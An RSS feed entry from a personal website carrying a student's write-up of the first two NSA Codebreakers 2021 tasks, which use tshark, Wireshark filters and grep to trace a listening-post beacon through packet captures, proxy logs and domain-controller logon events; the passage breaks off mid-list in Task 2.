<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ctfs on Emily's Personal Website!</title><link>https://murphe22.com/tags/ctfs/</link><description>Emily's Personal Website! (ctfs)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 04 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://murphe22.com/tags/ctfs/index.xml" rel="self" type="application/rss+xml"/><item><title>NSA Codebreakers 2021</title><link>https://murphe22.com/posts/nsacodebreaker/</link><pubDate>Tue, 04 Jan 2022 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/nsacodebreaker/</guid><description>&lt;p>The 2021 Codebreaker Challenge consists of a series of tasks that are worth a varying amount of points based upon their difficulty. Schools will be ranked according to the total number of points accumulated by their students. Solutions may be submitted at any time for the duration of the Challenge.&lt;/p>
&lt;h1 id="intro" >Intro
&lt;span>
&lt;a href="#intro">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>NSA Codebreakers was quite a competition, but it was so fun. We had never been very involved with it until this year. Jonathan, Teddy, and I spearheaded recruitment for Codebreakers and we ended up getting almost 400 people from A&amp;amp;M to sign-up! As a university, we ended up in &lt;code>4th place&lt;/code>. For myself, participating in NSA Codebreakers was a great time and I learned a ton when going through the challenges.&lt;/p>
&lt;h1 id="task-1" >Task 1
&lt;span>
&lt;a href="#task-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>The NSA Cybersecurity Collaboration Center has a mission to prevent and eradicate threats to the US Defense Industrial Base (DIB). Based on information sharing agreements with several DIB companies, we need to determine if any of those companies are communicating with the actor&amp;rsquo;s infrastructure.&lt;/p>
&lt;p>You have been provided a capture of data en route to the listening post as well as a list of DIB company IP ranges. Identify any IPs associated with the DIB that have communicated with the LP.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>Network traffic heading to the LP (capture.pcap)&lt;/li>
&lt;li>DIB IP address ranges (ip_ranges.txt)&lt;/li>
&lt;/ul>
&lt;h2 id="solution" >Solution
&lt;span>
&lt;a href="#solution">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>taking the ip_ranges.txt, use tshark to extract the unique ip addresses&lt;/p>
&lt;p>&lt;code>tshark -r capture.pcap -T fields -e ip.src | sort | uniq &amp;gt; output.csv&lt;/code>&lt;/p>
&lt;p>b. make sure to get rid of the malicious LP (10.120.14.143)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>from there, make a script that will go through each of the ips and using ipaddress library and csv library, check to see if any of the ip subnets noted in the ip_ranges.txt&lt;/p>
&lt;/li>
&lt;li>
&lt;p>output of the file&lt;/p>
&lt;pre tabindex="0">&lt;code>192.168.19.21
198.18.79.146
198.19.39.130
198.19.206.53
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="alternate-way-to-solve" >Alternate way to solve
&lt;span>
&lt;a href="#alternate-way-to-solve">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>go into vim -&amp;gt; visual block mode to add the filter&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">198.18.152.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">23&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.226.176.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">21&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">192.168.20.128&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">25&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.36.0.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">18&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.147.88.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">22&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">192.168.19.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">27&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">198.19.122.144&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">28&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">198.18.23.160&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">29&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.198.78.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">26&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.147.176.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">22&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.244.177.128&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">26&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.44.192.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">20&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.28.176.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">20&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.0.0.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">18&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">198.19.39.128&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">25&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">198.18.79.144&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">28&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.57.162.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">24&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">198.19.246.160&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">27&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">192.168.131.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">28&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.201.15.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">24&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">198.18.92.136&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">29&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">198.19.206.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">25&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.254.178.104&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">29&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.47.0.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">16&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.233.93.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">24&lt;/span>
&lt;span style="color:#ff79c6">||&lt;/span> ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.246.32.0&lt;/span>&lt;span style="color:#ff79c6">/&lt;/span>&lt;span style="color:#bd93f9">19&lt;/span>
!(ip&lt;span style="color:#ff79c6">.&lt;/span>src&lt;span style="color:#ff79c6">==&lt;/span>&lt;span style="color:#bd93f9">10.120.14.143&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Go into wireshark and paste that input in the filter field&lt;/p>
&lt;/li>
&lt;li>
&lt;p>go into statistics (from the menu bar) -&amp;gt; endpoints -&amp;gt; check the &amp;ldquo;limit to display filter&amp;rdquo; -&amp;gt; go to IPv4 tab -&amp;gt; IPs are there!&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-2" >Task 2
&lt;span>
&lt;a href="#task-2">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>NSA notified FBI, which notified the potentially-compromised DIB Companies. The companies reported the compromise to the Defense Cyber Crime Center (DC3). One of them, Online Operations and Production Services (OOPS) requested FBI assistance. At the request of the FBI, we&amp;rsquo;ve agreed to partner with them in order to continue the investigation and understand the compromise.&lt;/p>
&lt;p>OOPS is a cloud containerization provider that acts as a one-stop shop for hosting and launching all sorts of containers &amp;ndash; rkt, Docker, Hyper-V, and more. They have provided us with logs from their network proxy and domain controller that coincide with the time that their traffic to the cyber actor&amp;rsquo;s listening post was captured.&lt;/p>
&lt;p>Identify the logon ID of the user session that communicated with the malicious LP (i.e.: on the machine that sent the beacon &lt;em>and&lt;/em> active at the time the beacon was sent).&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>Subnet associated with OOPS (oops_subnet.txt)&lt;/li>
&lt;li>Network proxy logs from Bluecoat server (proxy.log)&lt;/li>
&lt;li>Login data from domain controller (logins.json)&lt;/li>
&lt;/ul>
&lt;h2 id="solution-1" >Solution
&lt;span>
&lt;a href="#solution-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>Using the ip from the previous task and under the subnet defined in the oops_subnet.txt, run a grep to look within the proxy.log (where the ip is the listening post)&lt;/p>
&lt;p>&lt;code>grep 10.120.14.143 proxy.log&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#bd93f9">2021&lt;/span>&lt;span style="color:#ff79c6">-&lt;/span>&lt;span style="color:#bd93f9">03&lt;/span>&lt;span style="color:#ff79c6">-&lt;/span>&lt;span style="color:#bd93f9">16&lt;/span> &lt;span style="color:#bd93f9">08&lt;/span>:&lt;span style="color:#bd93f9">34&lt;/span>:&lt;span style="color:#bd93f9">49&lt;/span> &lt;span style="color:#bd93f9">40&lt;/span> &lt;span style="color:#bd93f9">10.210.95.77&lt;/span> &lt;span style="color:#bd93f9">200&lt;/span> TCP_MISS &lt;span style="color:#bd93f9">12734&lt;/span> &lt;span style="color:#bd93f9">479&lt;/span> GET http xomtq&lt;span style="color:#ff79c6">.&lt;/span>invalid analysis &lt;span style="color:#ff79c6">-&lt;/span> &lt;span style="color:#ff79c6">-&lt;/span> DIRECT &lt;span style="color:#ff79c6">**&lt;/span>&lt;span style="color:#bd93f9">10.120.14.143&lt;/span>&lt;span style="color:#ff79c6">**&lt;/span> application&lt;span style="color:#ff79c6">/&lt;/span>octet&lt;span style="color:#ff79c6">-&lt;/span>stream &lt;span style="color:#f1fa8c">&amp;#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&amp;#39;&lt;/span> PROXIED none &lt;span style="color:#ff79c6">-&lt;/span> &lt;span style="color:#bd93f9">10.210.94.189&lt;/span> SG&lt;span style="color:#ff79c6">-&lt;/span>HTTP&lt;span style="color:#ff79c6">-&lt;/span>Service &lt;span style="color:#ff79c6">-&lt;/span> none &lt;span style="color:#ff79c6">-&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Clean up the logins.json&lt;/p>
&lt;p>&lt;code>grep &amp;quot;logon\|log off&amp;quot; logins.json&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Create a Python script to parse through the JSON data to find the logons and log offs and see which LogonIds are associated with the time found from step 1&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#bd93f9">0X339534&lt;/span>
&lt;span style="color:#bd93f9">0X339757&lt;/span>
&lt;span style="color:#bd93f9">0X33946D&lt;/span>
&lt;span style="color:#bd93f9">0X339870&lt;/span>
&lt;span style="color:#bd93f9">0X339989&lt;/span>
&lt;span style="color:#bd93f9">0X339A8A&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>use a grep to in the json to find the specific LogonId with the IP from step 1&lt;/p>
&lt;p>a. &amp;ldquo;-E&amp;rdquo; means extended using a regex expression
i. you could do it without regex which is the grep query below (where the &amp;ldquo;&amp;quot; before the pipe notes that it is a OR operation)&lt;/p>
&lt;p>&lt;code>grep -E &amp;quot;0X339534|0X339757|0X33946D|0X339870|0X339989|0X339A8A&amp;quot; narrowed.json | grep &amp;quot;10.210.95.77&amp;quot;&lt;/code>&lt;/p>
&lt;p>&lt;code>grep &amp;quot;0X339534\|0X339757\|0X33946D\|0X339870\|0X339989\|0X339A8A&amp;quot; narrowed.json | grep &amp;quot;10.210.95.77&amp;quot;&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">{&lt;span style="color:#f1fa8c">&amp;#34;PayloadData1&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Target: OOPS.NET\\chambers.jennifer&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;PayloadData2&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;LogonType 3&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;PayloadData3&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;LogonId: 0X33946D&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;UserName&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;-\\-&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;RemoteHost&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;- (10.210.95.77)&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;ExecutableInfo&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;-&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;MapDescription&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Successful logon&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;ChunkNumber&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;Computer&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;OOPS-DC.oops.net&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;Payload&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;EventData\&amp;#34;: {\&amp;#34;Data\&amp;#34;: [{\&amp;#34;@Name\&amp;#34;: \&amp;#34;SubjectUserSid\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;S-1-0-0\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;SubjectUserName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;-\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;SubjectDomainName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;-\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;SubjectLogonId\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;0x0\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;TargetUserSid\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;S-1-5-21-3521346-774097835-5683131894-1126\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;TargetUserName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;chambers.jennifer\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;TargetDomainName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;OOPS.NET\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;TargetLogonId\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;0X33946D\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;LogonType\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;3\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;LogonProcessName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;Kerberos\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;AuthenticationPackageName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;Kerberos\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;WorkstationName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;-\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;LogonGuid\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;c5dfa92b-9ee6-4b7b-9029-207959f780e7\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;TransmittedServices\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;-\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;LmPackageName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;-\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;KeyLength\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;0\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;ProcessId\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;0x0\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;ProcessName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;-\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;IpAddress\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;10.210.95.77\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;IpPort\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;39845\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;ImpersonationLevel\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;%%1833\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;RestrictedAdminMode\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;-\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;TargetOutboundUserName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;-\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;TargetOutboundDomainName\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;-\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;VirtualAccount\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;%%1843\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;TargetLinkedLogonId\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;0x0\&amp;#34;}, {\&amp;#34;@Name\&amp;#34;: \&amp;#34;ElevatedToken\&amp;#34;, \&amp;#34;#text\&amp;#34;: \&amp;#34;%%1842\&amp;#34;}]}}&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;Channel&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Security&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;Provider&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Microsoft-Windows-Security-Auditing&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;EventId&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#bd93f9">4624&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;EventRecordId&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;5378&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;ProcessId&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#bd93f9">693&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;ThreadId&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#bd93f9">5958&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;Level&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;LogAlways&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;Keywords&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Audit success&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;SourceFile&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;C:\\Windows\\system32\\winevt\\Logs\\Security.evtx&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;ExtraDataOffset&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;HiddenRecord&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#ff79c6">false&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;TimeCreated&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;2021-03-16T12:09:22.6771601+00:00&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;RecordNumber&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;5378&amp;#34;&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
